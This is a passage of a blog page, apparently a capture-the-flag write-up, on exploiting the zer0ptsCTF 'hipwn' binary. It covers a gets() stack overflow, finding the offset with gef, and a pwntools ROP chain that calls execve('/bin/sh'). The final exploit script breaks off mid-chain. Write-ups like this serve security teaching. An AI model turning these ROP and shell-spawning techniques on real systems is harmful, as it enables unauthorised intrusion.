@@ -1,0 +1,1265 @@
+<!DOCTYPE HTML>
+<html lang="en-EN">
+
+
+<head><meta name="generator" content="Hexo 3.9.0">
+    <meta charset="utf-8">
+    <meta name="keywords" content="zer0ptsCTF - Hipwn Challenge, D4mianWayne">
+    <meta name="description" content="Pwning Binaries with one goal to be bests">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-144686323-1"></script>
+<script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag() {
+        dataLayer.push(arguments);
+    }
+
+    gtag('js', new Date());
+    gtag('config', 'UA-144686323-1');
+</script>
+
+
+    <title>zer0ptsCTF - Hipwn Challenge | Pwning 24/7</title>
+    <link rel="icon" type="image/png" href="/favicon.png">
+
+    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
+    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+    <link rel="stylesheet" type="text/css" href="/css/matery.css">
+    <link rel="stylesheet" type="text/css" href="/css/my.css">
+
+    <script src="/libs/jquery/jquery.min.js"></script>
+
+<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
+
+
+<body>
+    <header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">Pwning 24/7</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
+<ul class="right nav-menu">
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/" class="waves-effect waves-light">
+      
+      <i class="fas fa-home" style="zoom: 0.6;"></i>
+      
+      <span>home</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/tags" class="waves-effect waves-light">
+      
+      <i class="fas fa-tags" style="zoom: 0.6;"></i>
+      
+      <span>tags</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/categories" class="waves-effect waves-light">
+      
+      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
+      
+      <span>Categories</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/archives" class="waves-effect waves-light">
+      
+      <i class="fas fa-archive" style="zoom: 0.6;"></i>
+      
+      <span>Archives</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/about" class="waves-effect waves-light">
+      
+      <i class="fas fa-user-circle-o" style="zoom: 0.6;"></i>
+      
+      <span>About</span>
+    </a>
+    
+  </li>
+  
+  <li>
+    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+      <i id="searchIcon" class="fas fa-search" title="Search" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+</ul>
+
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="/medias/logo.png" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">Pwning 24/7</div>
+        <div class="logo-desc">
+            
+            Pwning Binaries with one goal to be bests
+            
+        </div>
+    </div>
+
+    
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li class="m-nav-item">
+	  
+		<a href="/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-home"></i>
+			
+			home
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/tags" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-tags"></i>
+			
+			tags
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/categories" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-bookmark"></i>
+			
+			Categories
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/archives" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-archive"></i>
+			
+			Archives
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/about" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-user-circle-o"></i>
+			
+			About
+		</a>
+          
+        </li>
+        
+        
+        <li><div class="divider"></div></li>
+        <li>
+            <a href="https://github.com/D4mianWayne" class="waves-effect waves-light" target="_blank">
+                <i class="fab fa-github-square fa-fw"></i>My Github
+            </a>
+        </li>
+        
+    </ul>
+</div>
+
+
+        </div>
+
+        
+            <style>
+    .nav-transparent .github-corner {
+        display: none !important;
+    }
+
+    .github-corner {
+        position: absolute;
+        z-index: 10;
+        top: 0;
+        right: 0;
+        border: 0;
+        transform: scale(1.1);
+    }
+
+    .github-corner svg {
+        color: #0f9d58;
+        fill: #fff;
+        height: 64px;
+        width: 64px;
+    }
+
+    .github-corner:hover .octo-arm {
+        animation: a 0.56s ease-in-out;
+    }
+
+    .github-corner .octo-arm {
+        animation: none;
+    }
+
+    @keyframes a {
+        0%,
+        to {
+            transform: rotate(0);
+        }
+        20%,
+        60% {
+            transform: rotate(-25deg);
+        }
+        40%,
+        80% {
+            transform: rotate(10deg);
+        }
+    }
+</style>
+
+<a href="https://github.com/D4mianWayne" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
+   data-tooltip="My Github" data-position="left" data-delay="50">
+    <svg viewBox="0 0 250 250" aria-hidden="true">
+        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
+        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
+              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
+        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
+              fill="currentColor" class="octo-body"></path>
+    </svg>
+</a>
+        
+    </nav>
+
+</header>
+
+    
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/19.jpg')">
+    <div class="container" style="right: 0px;left: 0px;">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <h1 class="description center-align post-title">zer0ptsCTF - Hipwn Challenge</h1>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+<main class="post-container content">
+
+    
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
+<style>
+    #articleContent h1::before,
+    #articleContent h2::before,
+    #articleContent h3::before,
+    #articleContent h4::before,
+    #articleContent h5::before,
+    #articleContent h6::before {
+        display: block;
+        content: " ";
+        height: 100px;
+        margin-top: -100px;
+        visibility: hidden;
+    }
+
+    #articleContent :focus {
+        outline: none;
+    }
+
+    .toc-fixed {
+        position: fixed;
+        top: 64px;
+    }
+
+    .toc-widget {
+        width: 345px;
+        padding-left: 20px;
+    }
+
+    .toc-widget .toc-title {
+        margin: 35px 0 15px 0;
+        padding-left: 17px;
+        font-size: 1.5rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    .toc-widget ol {
+        padding: 0;
+        list-style: none;
+    }
+
+    #toc-content {
+        height: calc(100vh - 250px);
+        overflow: auto;
+    }
+
+    #toc-content ol {
+        padding-left: 10px;
+    }
+
+    #toc-content ol li {
+        padding-left: 10px;
+    }
+
+    #toc-content .toc-link:hover {
+        color: #42b983;
+        font-weight: 700;
+        text-decoration: underline;
+    }
+
+    #toc-content .toc-link::before {
+        background-color: transparent;
+        max-height: 25px;
+
+        position: absolute;
+        right: 23.5vw;
+        display: block;
+    }
+
+    .toc-fixed .toc-link::before{
+        position: fixed!important;/*当toc的位置改为fixed时，.toc-link::before也要改为fixed*/
+    }
+
+    #toc-content .is-active-link {
+        color: #42b983;
+    }
+
+    #toc-content .is-active-link::before {
+        background-color: #42b983;
+    }
+
+    #floating-toc-btn {
+        position: fixed;
+        right: 15px;
+        bottom: 76px;
+        padding-top: 15px;
+        margin-bottom: 0;
+        z-index: 998;
+    }
+
+    #floating-toc-btn .btn-floating {
+        width: 48px;
+        height: 48px;
+    }
+
+    #floating-toc-btn .btn-floating i {
+        line-height: 48px;
+        font-size: 1.4rem;
+    }
+</style>
+<div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                          <div class="article-tag">
+                            <span class="chip bg-color">No tag</span>
+                          </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-minus fa-fw"></i>Publish Date:&nbsp;&nbsp;
+                    1970-01-01
+                </div>
+                
+
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-file-word fa-fw"></i>Word Count:&nbsp;&nbsp;
+                    1.1k
+                </div>
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-clock fa-fw"></i>Read Times:&nbsp;&nbsp;
+                    6 Min
+                </div>
+                
+
+                
+                    <div id="busuanzi_container_page_pv" class="info-break-policy">
+                        <i class="far fa-eye fa-fw"></i>Read Count:&nbsp;&nbsp;
+                        <span id="busuanzi_value_page_pv"></span>
+                    </div>
+				
+            </div>
+        </div>
+        <hr class="clearfix">
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <p>Writeup on how I managed to solve <a href="/assets/hipwn">hipwn</a> from <a href="https://www.zer0pts.com" target="_blank" rel="noopener">zer0ptsCTF</a>.</p>
+<h1 id="Analzying-Source-Code-and-Binary"><a href="#Analzying-Source-Code-and-Binary" class="headerlink" title="Analzying Source Code and Binary"></a>Analzying Source Code and Binary</h1><p>So, we got 2 files in a gzip archive, one which is <code>main.c</code> which is the source code of the binary and <code>chall</code> which is the executable we need to pwn. Let’s check it out:-</p>
+<pre class=" language-C"><code class="language-C">#include <stdio.h>
+
+int main(void) {
+  char name[0x100];
+  puts("What's your team name?");
+  gets(name);
+  printf("Hi, %s. Welcome to zer0pts CTF 2020!\n", name);
+  return 0;
+}</code></pre>
+<p>Looks simple enough, of course we have <code>gets</code> which means we have a buffer overflow vulnerability which seems obvious. Other than that, nothing is really much of a concern.<br>Let’s run file and check the output:-</p>
+<pre class=" language-r"><code class="language-r">robin<span class="token operator">@</span>oracle<span class="token operator">:</span><span class="token operator">~</span><span class="token operator">/</span>CTFs<span class="token operator">$</span> file chall
+chall<span class="token operator">:</span> ELF <span class="token number">64</span><span class="token operator">-</span>bit LSB executable<span class="token punctuation">,</span> x86<span class="token operator">-</span><span class="token number">64</span><span class="token punctuation">,</span> version <span class="token number">1</span> <span class="token punctuation">(</span>SYSV<span class="token punctuation">)</span><span class="token punctuation">,</span> statically linked<span class="token punctuation">,</span> stripped</code></pre>
+<p>Damn, it is <strong>statically linked</strong> which means that all the libc functions which are used in the binary i.e. <code>puts</code>, <code>printf</code>, <code>gets</code> etc. are embedded in the binary itself and it is stripped which means no debugging symbols. Let’s see the binary and run the <code>checksec</code> to see what protections it has:-</p>
+<pre class=" language-r"><code class="language-r">robin<span class="token operator">@</span>oracle<span class="token operator">:</span><span class="token operator">~</span><span class="token operator">/</span>CTFs<span class="token operator">$</span> checksec chall
+<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> <span class="token string">'/home/robin/CTFs/chall'</span>
+    Arch<span class="token operator">:</span>     amd64<span class="token operator">-</span><span class="token number">64</span><span class="token operator">-</span>little
+    RELRO<span class="token operator">:</span>    Partial RELRO
+    Stack<span class="token operator">:</span>    No canary found
+    NX<span class="token operator">:</span>       NX enabled
+    PIE<span class="token operator">:</span>      No PIE <span class="token punctuation">(</span><span class="token number">0x400000</span><span class="token punctuation">)</span></code></pre>
+<p>If it was <strong>dynamically linked</strong> binary we could have done something like leak any GOT address and then calculate the offsets to do something like <code>system(&quot;/bin/sh&quot;)</code>. But since it is <strong>statically linked</strong> it is pointless approach, we gotta use stuffs which are available in binary itself.</p>
+<h1 id="Reverse-Engineering-the-Binary"><a href="#Reverse-Engineering-the-Binary" class="headerlink" title="Reverse Engineering the Binary"></a>Reverse Engineering the Binary</h1><p>Time to reverse enginneer the binary so that we could get the address of some useful functions. Let’s check out the main function:-</p>
+<pre class=" language-C"><code class="language-C">__int64 sub_400160()
+{
+  __int64 v1; // [rsp+0h] [rbp-108h]
+
+  sub_40062F("What's your team name?");
+  sub_4004EE(&v1);
+  sub_400591((unsigned __int64)"Hi, %s. Welcome to zer0pts CTF 2020!\n");
+  return 0LL;
+}</code></pre>
+<p>There we go, from source code we know the following things:-</p>
+<ul>
+<li><code>puts(&quot;What&#39;s your team name?&quot;)</code> : <code>sub_40062F(&quot;What&#39;s your team name?&quot;)</code></li>
+<li><code>gets(name)</code> : <code>sub_4004EE(&amp;v1)</code></li>
+<li><code>printf(&quot;Hi, %s. Welcome to zer0pts CTF 2020!\n&quot;, name)</code>  :<code>sub_400591((unsigned __int64)&quot;Hi, %s. Welcome to zer0pts CTF 2020!\n&quot;)</code></li>
+</ul>
+<p>So, now we know that <code>0x4004EE</code> is the address of the <code>gets</code> and <code>0x40062F</code> is the address of <code>puts</code> and <code>0x400591</code> is the address of the <code>printf</code>, let’s keep this thing in mind and time to pwn it.</p>
+<h1 id="Pwning-Time"><a href="#Pwning-Time" class="headerlink" title="Pwning Time"></a>Pwning Time</h1><p>So, my initial step was to use any address from <code>bss</code> to store thw address of <code>/bin/sh</code> and after that make a <code>exceve</code> syscall to spawn a shell. I used <code>pwntools</code> to automate most of the parts like getting the <code>bss</code> address and incrementing it by <code>0x200</code> offsets so that the initial address wom’t be overwritten as <code>bss</code> loads IO related informations. Let’s get it done:-</p>
+<h5 id="Finding-offsets"><a href="#Finding-offsets" class="headerlink" title="Finding offsets"></a>Finding offsets</h5><p>Finding the offset with <code>gdb-gef</code>‘s <code>de-brujin</code> based <code>pattern search</code>:-</p>
+<pre class=" language-r"><code class="language-r">gef➤  pattern create <span class="token number">300</span>
+<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> Generating a pattern of <span class="token number">300</span> bytes
+aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaaabdaaaaaabeaaaaaabfaaaaaabgaaaaaabhaaaaaabiaaaaaabjaaaaaabkaaaaaablaaaaaabmaaa
+<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> Saved as <span class="token string">'$_gef1'</span>
+gef➤  r
+Starting program<span class="token operator">:</span> <span class="token operator">/</span>home<span class="token operator">/</span>robin<span class="token operator">/</span>CTFs<span class="token operator">/</span>chall 
+What's your team name?
+aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaaabdaaaaaabeaaaaaabfaaaaaabgaaaaaabhaaaaaabiaaaaaabjaaaaaabkaaaaaablaaaaaabmaaa
+Hi<span class="token punctuation">,</span> aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaaabdaaaaaabeaaaaaabfaaaaaabgaaaaaabhaaaaaabiaaaaaabjaaaaaabkaaaaaablaaaaaabmaaa. Welcome to zer0pts CTF <span class="token number">2020</span><span class="token operator">!</span>
+
+Program received signal SIGSEGV<span class="token punctuation">,</span> Segmentation fault.
+<span class="token punctuation">[</span> Legend<span class="token operator">:</span> Modified register <span class="token operator">|</span> Code <span class="token operator">|</span> Heap <span class="token operator">|</span> Stack <span class="token operator">|</span> String <span class="token punctuation">]</span>
+────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
+<span class="token operator">$</span>rax   <span class="token operator">:</span> <span class="token number">0x0</span>               
+<span class="token operator">$</span>rbx   <span class="token operator">:</span> <span class="token number">0x6261616161616168</span> <span class="token punctuation">(</span><span class="token string">"haaaaaab"</span>?<span class="token punctuation">)</span>
+<span class="token operator">$</span>rcx   <span class="token operator">:</span> <span class="token number">0x0</span>               
+<span class="token operator">$</span>rdx   <span class="token operator">:</span> <span class="token number">0xffffffff</span>        
+<span class="token operator">$</span>rsp   <span class="token operator">:</span> <span class="token number">0x00007fffffffddf8</span>  →  <span class="token string">"iaaaaaabjaaaaaabkaaaaaablaaaaaabmaaa"</span>
+<span class="token operator">$</span>rbp   <span class="token operator">:</span> <span class="token number">0x00007fffffffde38</span>  →  <span class="token number">0x00007fffffffe1e1</span>  →  <span class="token string">"/home/robin/CTFs/chall"</span>
+<span class="token operator">$</span>rsi   <span class="token operator">:</span> <span class="token number">0x0000000000402efd</span>  →   add BYTE PTR <span class="token punctuation">[</span>rax<span class="token punctuation">]</span><span class="token punctuation">,</span> al
+<span class="token operator">$</span>rdi   <span class="token operator">:</span> <span class="token number">0x0000000000604688</span>  →  <span class="token string">"Hi, aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaa[...]"</span>
+<span class="token operator">$</span>rip   <span class="token operator">:</span> <span class="token number">0x000000000040019c</span>  →   ret 
+<span class="token operator">$</span>r8    <span class="token operator">:</span> <span class="token number">0x2000</span>            
+<span class="token operator">$</span>r9    <span class="token operator">:</span> <span class="token number">0x12c</span>             
+<span class="token operator">$</span>r10   <span class="token operator">:</span> <span class="token number">0x8080808080808080</span>
+<span class="token operator">$</span>r11   <span class="token operator">:</span> <span class="token number">0x202</span>             
+<span class="token operator">$</span>r12   <span class="token operator">:</span> <span class="token number">0x0000000000400160</span>  →   push rbx
+<span class="token operator">$</span>r13   <span class="token operator">:</span> <span class="token number">0x00007fffffffde48</span>  →  <span class="token number">0x00007fffffffe1f8</span>  →  <span class="token string">"CLUTTER_IM_MODULE=xim"</span>
+<span class="token operator">$</span>r14   <span class="token operator">:</span> <span class="token number">0x0</span>               
+<span class="token operator">$</span>r15   <span class="token operator">:</span> <span class="token number">0x0</span>               
+<span class="token operator">$</span>eflags<span class="token operator">:</span> <span class="token punctuation">[</span>ZERO carry PARITY adjust sign trap INTERRUPT direction overflow RESUME virtualx86 identification<span class="token punctuation">]</span>
+<span class="token operator">$</span>cs<span class="token operator">:</span> <span class="token number">0x0033</span> <span class="token operator">$</span>ss<span class="token operator">:</span> <span class="token number">0x002b</span> <span class="token operator">$</span>ds<span class="token operator">:</span> <span class="token number">0x0000</span> <span class="token operator">$</span>es<span class="token operator">:</span> <span class="token number">0x0000</span> <span class="token operator">$</span>fs<span class="token operator">:</span> <span class="token number">0x0000</span> <span class="token operator">$</span>gs<span class="token operator">:</span> <span class="token number">0x0000</span> 
+────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
+<span class="token number">0x00007fffffffddf8</span>│<span class="token operator">+</span><span class="token number">0x0000</span><span class="token operator">:</span> <span class="token string">"iaaaaaabjaaaaaabkaaaaaablaaaaaabmaaa"</span>     ← <span class="token operator">$</span>rsp
+<span class="token number">0x00007fffffffde00</span>│<span class="token operator">+</span><span class="token number">0x0008</span><span class="token operator">:</span> <span class="token string">"jaaaaaabkaaaaaablaaaaaabmaaa"</span>
+<span class="token number">0x00007fffffffde08</span>│<span class="token operator">+</span><span class="token number">0x0010</span><span class="token operator">:</span> <span class="token string">"kaaaaaablaaaaaabmaaa"</span>
+<span class="token number">0x00007fffffffde10</span>│<span class="token operator">+</span><span class="token number">0x0018</span><span class="token operator">:</span> <span class="token string">"laaaaaabmaaa"</span>
+<span class="token number">0x00007fffffffde18</span>│<span class="token operator">+</span><span class="token number">0x0020</span><span class="token operator">:</span> <span class="token number">0x000000006161616d</span> <span class="token punctuation">(</span><span class="token string">"maaa"</span>?<span class="token punctuation">)</span>
+<span class="token number">0x00007fffffffde20</span>│<span class="token operator">+</span><span class="token number">0x0028</span><span class="token operator">:</span> <span class="token number">0x0000000000000000</span>
+<span class="token number">0x00007fffffffde28</span>│<span class="token operator">+</span><span class="token number">0x0030</span><span class="token operator">:</span> <span class="token number">0x00000000004001b3</span>  →   lea rdx<span class="token punctuation">,</span> <span class="token punctuation">[</span>rdi<span class="token operator">+</span><span class="token number">0x8</span><span class="token punctuation">]</span>
+<span class="token number">0x00007fffffffde30</span>│<span class="token operator">+</span><span class="token number">0x0038</span><span class="token operator">:</span> <span class="token number">0x0000000000000001</span>
+──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code<span class="token operator">:</span>x86<span class="token operator">:</span><span class="token number">64</span> ────
+     <span class="token number">0x400192</span>                  add    rsp<span class="token punctuation">,</span> <span class="token number">0x100</span>
+     <span class="token number">0x400199</span>                  xor    eax<span class="token punctuation">,</span> eax
+     <span class="token number">0x40019b</span>                  pop    rbx
+ →   <span class="token number">0x40019c</span>                  ret    
+<span class="token punctuation">[</span><span class="token operator">!</span><span class="token punctuation">]</span> Cannot disassemble from <span class="token operator">$</span>PC
+──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
+<span class="token punctuation">[</span><span class="token comment" spellcheck="true">#0] Id 1, Name: "chall", stopped 0x40019c in ?? (), reason: SIGSEGV</span>
+────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
+<span class="token punctuation">[</span><span class="token comment" spellcheck="true">#0] 0x40019c → ret </span>
+─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+<span class="token number">0x000000000040019c</span> <span class="token keyword">in</span> ?? <span class="token punctuation">(</span><span class="token punctuation">)</span>
+gef➤  x<span class="token operator">/</span>xg <span class="token operator">$</span>rsp
+<span class="token number">0x7fffffffddf8</span><span class="token operator">:</span>    <span class="token number">0x6261616161616169</span>
+gef➤  pattern search <span class="token number">0x6261616161616169</span>
+<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> Searching <span class="token string">'0x6261616161616169'</span>
+<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> Found at offset <span class="token number">264</span> <span class="token punctuation">(</span>little<span class="token operator">-</span>endian search<span class="token punctuation">)</span> likely</code></pre>
+<p>Adding it to exploit:-</p>
+<pre class=" language-python"><code class="language-python">payload <span class="token operator">=</span> <span class="token string">"A"</span><span class="token operator">*</span><span class="token number">264</span></code></pre>
+<h5 id="Using-gets-to-store-bin-sh-adddress"><a href="#Using-gets-to-store-bin-sh-adddress" class="headerlink" title="Using gets to store /bin/sh adddress"></a>Using <code>gets</code> to store /bin/sh adddress</h5><p>This one does <code>gets(writeable_addr)</code> as in 64 bit binaries <code>rdi</code> has first arguments.</p>
+<pre class=" language-python"><code class="language-python">payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span> 
+payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>writable_readable_addr<span class="token punctuation">)</span>
+payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x4004EE</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># We know the `gets` address from RE part</span></code></pre>
+<h5 id="Doing-a-execve-syscall"><a href="#Doing-a-execve-syscall" class="headerlink" title="Doing a execve syscall"></a>Doing a <code>execve</code> syscall</h5><p>Since we have found offsets and chained the rop chain to store <code>/bin/sh</code> in bss address, time to do a <code>execve</code> syscall:-</p>
+<pre class=" language-python"><code class="language-python">payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rax<span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># This one holds the number of which syscall has to done</span>
+payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x3b</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># This ensures `rax` contains `0x3b` which means it is doing an `execve`</span>
+payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># Popping `rdi` address</span>
+payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>writable_readable_addr<span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># writeable address which has `/bin/sh` is loaded to `rdi`</span>
+payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rsi<span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># Popping `rsi` and `r15`</span>
+payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># Loading `0` to `rsi`</span>
+payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># Loading `0` to `r15` </span>
+payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdx<span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># Popping rdx</span>
+payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># We will load to `0` to `rdx`</span>
+payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>syscall<span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># Adding `syscall; ret;` at last to request syscall</span></code></pre>
+<p>We are doing <code>execve(&quot;/bin/sh&quot;, 0, 0)</code> to spawn a shell. </p>
+<h5 id="Final-Exploit"><a href="#Final-Exploit" class="headerlink" title="Final Exploit"></a>Final Exploit</h5><p>Here is the final exploit:-</p>
+<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+
+pop_rdi <span class="token operator">=</span> <span class="token number">0x000000000040141c</span> <span class="token comment" spellcheck="true"># pop rdu; ret;</span>
+pop_rdx <span class="token operator">=</span> <span class="token number">0x00000000004023f5</span> <span class="token comment" spellcheck="true"># pop rdx; ret;</span>
+pop_rsi <span class="token operator">=</span> <span class="token number">0x000000000040141a</span> <span class="token comment" spellcheck="true"># pop rsi; pop r15; ret;</span>
+pop_rax <span class="token operator">=</span> <span class="token number">0x0000000000400121</span> <span class="token comment" spellcheck="true"># pop rax; ret;</span>
+syscall <span class="token operator">=</span> <span class="token number">0x00000000004024dd</span> <span class="token comment" spellcheck="true"># syscall; ret;</span>
+
+elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./chall"</span><span class="token punctuation">)</span>
+writable_readable_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>bss<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">0x200</span>
+
+payload <span class="token operator">=</span> b<span class="token string">"A"</span><span class="token operator">*</span><span class="token number">264</span>
+payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span> 
+payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>writable_readable_addr<span class="token punctuation">)</span>
+payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x4004EE</span><span class="token punctuation">)</span>
+payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span>
+payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>writable_readable_addr<span class="token punctuation">)</span>
+payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x40062F</span><span class="token punctuation">)</span>
+payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rax<span class="token punctuation">)</span>
